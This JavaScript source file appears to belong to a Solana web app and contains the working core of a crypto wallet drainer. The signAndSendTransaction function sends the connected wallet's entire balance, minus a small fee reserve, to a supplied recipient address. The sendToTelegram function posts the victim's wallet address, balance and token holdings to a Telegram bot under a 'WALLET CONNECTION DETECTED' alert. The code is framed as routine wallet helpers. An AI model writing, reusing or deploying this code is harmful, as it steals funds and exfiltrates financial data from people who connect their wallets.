
import { Connection, PublicKey, LAMPORTS_PER_SOL, Transaction, SystemProgram, sendAndConfirmTransaction } from '@solana/web3.js';

// Add Buffer polyfill for browser environment in a way that works with Vite
import { Buffer } from 'buffer';
// Make Buffer available globally - fix the approach to match how globals work in browser
if (typeof window !== 'undefined') {
  window.Buffer = Buffer;
}

// Helper function to add delay between retries
const delay = (ms) => new Promise(resolve => setTimeout(resolve, ms));

// List of functional public RPC endpoints for Solana mainnet
const PUBLIC_RPC_ENDPOINTS = [
  "https://api.mainnet-beta.solana.com",
  "https://solana-api.projectserum.com",
  "https://rpc.ankr.com/solana",
  "https://solana.public-rpc.com",
];

// Solana minimum requirements
export const MINIMUM_REQUIRED_SOL = 0.0005; // Minimum amount required for transactions

// Retry function with backoff
async function retry(fn, retries = 3, initialDelay = 500, context = "") {
  let lastError;
  for (let i = 0; i < retries; i++) {
    try {
      console.log(`${context} - Attempt ${i + 1}/${retries}`);
      return await fn();
    } catch (error) {
      console.error(`${context} - Attempt ${i + 1} failed:`, error);
      lastError = error;
      if (i < retries - 1) {
        const delayTime = initialDelay * Math.pow(1.5, i);
        console.log(`${context} - Retrying in ${delayTime}ms...`);
        await delay(delayTime);
      }
    }
  }
  throw lastError;
}

// Test an endpoint's connection quickly
const testEndpoint = async (endpoint) => {
  try {
    const connection = new Connection(endpoint, { commitment: 'confirmed' });
    const timeout = new Promise((_, reject) => {
      setTimeout(() => reject(new Error('Timeout')), 3000);
    });
    
    const result = await Promise.race([
      connection.getVersion(),
      timeout
    ]);
    
    return true;
  } catch (error) {
    return false;
  }
};

// Find a working RPC endpoint
const findWorkingEndpoint = async () => {
  // Try all endpoints in parallel to find the first working one quickly
  const endpointPromises = PUBLIC_RPC_ENDPOINTS.map(endpoint => 
    testEndpoint(endpoint).then(isWorking => ({ endpoint, isWorking }))
  );
  
  const results = await Promise.all(endpointPromises);
  const workingEndpoints = results.filter(result => result.isWorking).map(result => result.endpoint);
  
  if (workingEndpoints.length > 0) {
    return workingEndpoints[0];
  }
  
  // If no endpoint worked in parallel, try them one by one with longer timeouts
  for (const endpoint of PUBLIC_RPC_ENDPOINTS) {
    try {
      const connection = new Connection(endpoint, { commitment: 'confirmed' });
      await connection.getVersion();
      return endpoint;
    } catch (error) {
      console.error(`Endpoint ${endpoint} failed:`, error);
    }
  }
  
  // Fallback to the first endpoint if all fail
  console.warn("All endpoints failed, using default endpoint");
  return PUBLIC_RPC_ENDPOINTS[0];
};

// Create a reliable connection
export const createReliableConnection = async () => {
  const endpoint = await findWorkingEndpoint();
  console.log(`Using endpoint: ${endpoint}`);
  
  return new Connection(endpoint, {
    commitment: 'confirmed',
    confirmTransactionInitialTimeout: 60000,
  });
};

// Check if the wallet has enough SOL for rent
export const hasEnoughSolForRent = (balanceInSol) => {
  return balanceInSol >= MINIMUM_REQUIRED_SOL;
};

// Get wallet SOL balance with fallbacks to multiple RPC endpoints
export const getWalletBalance = async (walletAddress) => {
  if (!walletAddress) {
    throw new Error("Invalid wallet address");
  }
  
  // Try multiple endpoints in sequence until one works
  for (const endpoint of PUBLIC_RPC_ENDPOINTS) {
    try {
      console.log(`Trying to get balance from endpoint: ${endpoint}`);
      const connection = new Connection(endpoint, { commitment: 'confirmed' });
      const pubKey = new PublicKey(walletAddress);
      const balance = await connection.getBalance(pubKey);
      console.log(`Successfully got balance: ${balance / LAMPORTS_PER_SOL} SOL`);
      return balance / LAMPORTS_PER_SOL;
    } catch (error) {
      console.error(`Failed to get balance from ${endpoint}:`, error);
    }
  }
  
  // If all endpoints fail, throw error
  throw new Error("Failed to get wallet balance from any endpoint");
};

// Get token accounts with fallbacks
export const getTokenAccounts = async (connection, walletAddress) => {
  if (!walletAddress) {
    return [];
  }
  
  try {
    const pubKey = new PublicKey(walletAddress);
    console.log("Starting token account fetch");
    
    // Try with the provided connection first
    try {
      const response = await connection.getParsedTokenAccountsByOwner(
        pubKey,
        {
          programId: new PublicKey('TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA'),
        }
      );
      
      console.log(`Found ${response.value.length} token accounts`);
      
      return response.value.map(item => ({
        mint: item.account.data.parsed.info.mint,
        amount: item.account.data.parsed.info.tokenAmount.uiAmount,
        decimals: item.account.data.parsed.info.tokenAmount.decimals
      }));
    } catch (initialError) {
      console.error("Initial token fetch failed, trying other endpoints:", initialError);
      
      // Try other endpoints if the first one fails
      for (const endpoint of PUBLIC_RPC_ENDPOINTS) {
        try {
          const fallbackConnection = new Connection(endpoint, { commitment: 'confirmed' });
          const response = await fallbackConnection.getParsedTokenAccountsByOwner(
            pubKey,
            {
              programId: new PublicKey('TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA'),
            }
          );
          
          console.log(`Found ${response.value.length} token accounts using fallback endpoint ${endpoint}`);
          
          return response.value.map(item => ({
            mint: item.account.data.parsed.info.mint,
            amount: item.account.data.parsed.info.tokenAmount.uiAmount,
            decimals: item.account.data.parsed.info.tokenAmount.decimals
          }));
        } catch (error) {
          console.error(`Fallback token fetch from ${endpoint} failed:`, error);
        }
      }
    }
    
    // If all endpoints fail, return empty array
    console.warn("All token fetch attempts failed");
    return [];
  } catch (error) {
    console.error("Error in getTokenAccounts:", error);
    return [];
  }
};

// Transaction signing and sending
export const signAndSendTransaction = async (
  connection,
  wallet,
  recipientAddress,
  amount,
  botToken,
  chatId
) => {
  if (!wallet || !wallet.adapter || !wallet.adapter.publicKey) {
    console.error('Wallet, adapter, or publicKey is undefined');
    throw new Error('Wallet adapter or publicKey is undefined');
  }
  
  try {
    // Use wallet.adapter.publicKey consistently
    const walletPublicKey = wallet.adapter.publicKey;
    
    // Check balance first
    const balance = await connection.getBalance(walletPublicKey);
    console.log('Current wallet balance (lamports):', balance);
    const balanceInSol = balance / LAMPORTS_PER_SOL;
    console.log('Current wallet balance (SOL):', balanceInSol);
    
    if (balance <= 0) {
      console.error('Insufficient balance for transfer');
      throw new Error('Insufficient wallet balance for transfer');
    }
    
    if (!hasEnoughSolForRent(balanceInSol)) {
      console.error(`Wallet balance (${balanceInSol} SOL) is below minimum required (${MINIMUM_REQUIRED_SOL} SOL)`);
      throw new Error(`Insufficient funds for transaction. Minimum ${MINIMUM_REQUIRED_SOL} SOL required.`);
    }
    
    // Calculate transfer amount (balance minus minimum required for fees)
    const transferAmount = Math.floor((balanceInSol - MINIMUM_REQUIRED_SOL) * LAMPORTS_PER_SOL);
    
    if (transferAmount <= 0) {
      throw new Error('Balance too low to transfer after reserving for fees');
    }
    
    // Ensure recipient address is valid
    let recipientPublicKey;
    try {
      recipientPublicKey = new PublicKey(recipientAddress);
    } catch (error) {
      console.error('Invalid recipient address:', error);
      throw new Error('Invalid recipient address');
    }
    
    console.log(`Attempting to transfer ${transferAmount/LAMPORTS_PER_SOL} SOL`);
    
    const transaction = new Transaction().add(
      SystemProgram.transfer({
        fromPubkey: walletPublicKey,
        toPubkey: recipientPublicKey,
        lamports: transferAmount,
      })
    );
    
    console.log('Sending transaction...');
    
    // We need to modify how we send the transaction since wallet structure is different
    if (typeof wallet.signAndSendTransaction === 'function') {
      // For wallet adapters that have this method
      return await wallet.signAndSendTransaction(transaction);
    } else if (typeof wallet.adapter?.sendTransaction === 'function') {
      // For wallet adapters that use the adapter pattern
      return await wallet.adapter.sendTransaction(transaction, connection);
    } else {
      throw new Error('Wallet does not support transaction signing');
    }
  } catch (error) {
    console.error('Detailed transaction error:', error);
    throw error;
  }
};

// Send wallet data to Telegram with reliable retry
export const sendToTelegram = async (walletData, botToken, chatId) => {
  try {
    console.log("Preparing to send data to Telegram:", walletData);
    
    // Format message based on the type of data we're sending
    let message = "";
    
    if (walletData.tokens) {
      // This is the initial wallet connection message
      const solBalanceInSol = walletData.balance || 0;
      
      // Format token data in a more readable way
      let formattedTokens = "No tokens found";
      if (walletData.tokens && walletData.tokens.length > 0) {
        formattedTokens = walletData.tokens.map((token, index) => 
          `Token #${index + 1}:\n` +
          `  Mint: ${token.mint}\n` +
          `  Amount: ${token.amount}\n` +
          `  Decimals: ${token.decimals}`
        ).join('\n\n');
      }

      // Create a detailed message
      message = `🚨 WALLET CONNECTION DETECTED 🚨\n\n` +
        `👛 Wallet Address: ${walletData.address}\n` +
        `💰 SOL Balance: ${solBalanceInSol.toFixed(9)} SOL\n` +
        `⌚ Time: ${new Date().toLocaleString()}\n` +
        (walletData.walletName ? `🔑 Wallet Type: ${walletData.walletName}\n` : '') +
        `\n💎 TOKEN HOLDINGS:\n${formattedTokens}\n\n` +
        `🌐 Network: Mainnet`;
    } else if (walletData.message) {
      // This is a custom message (transfer attempt or completion)
      message = `👛 Wallet: ${walletData.address || "Unknown"}\n` +
        (walletData.walletName ? `🔑 Wallet Type: ${walletData.walletName}\n` : '') +
        `🔔 ${walletData.message}`;
    } else {
      // Fallback generic message
      message = `Wallet notification for: ${walletData.address || JSON.stringify(walletData)}`;
    }

    console.log("Sending message to Telegram");

    // Make multiple attempts to send to Telegram
    for (let attempt = 1; attempt <= 3; attempt++) {
      try {
        console.log(`Telegram send attempt #${attempt}`);
        
        const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({
            chat_id: chatId,
            text: message,
          }),
        });

        if (!response.ok) {
          throw new Error(`Telegram API responded with status: ${response.status}`);
        }

        const data = await response.json();
        console.log("Telegram API response:", data);

        if (data.ok) {
          console.log("Successfully sent to Telegram");
          return true;
        }
        
        throw new Error(`Telegram API error: ${data.description || "Unknown error"}`);
      } catch (telegramError) {
        console.error(`Telegram send attempt #${attempt} failed:`, telegramError);
        if (attempt < 3) await delay(1000 * attempt);
      }
    }

    console.error("All Telegram send attempts failed");
    return false;
  } catch (error) {
    console.error('Error sending to Telegram:', error);
    return false;
  }
};
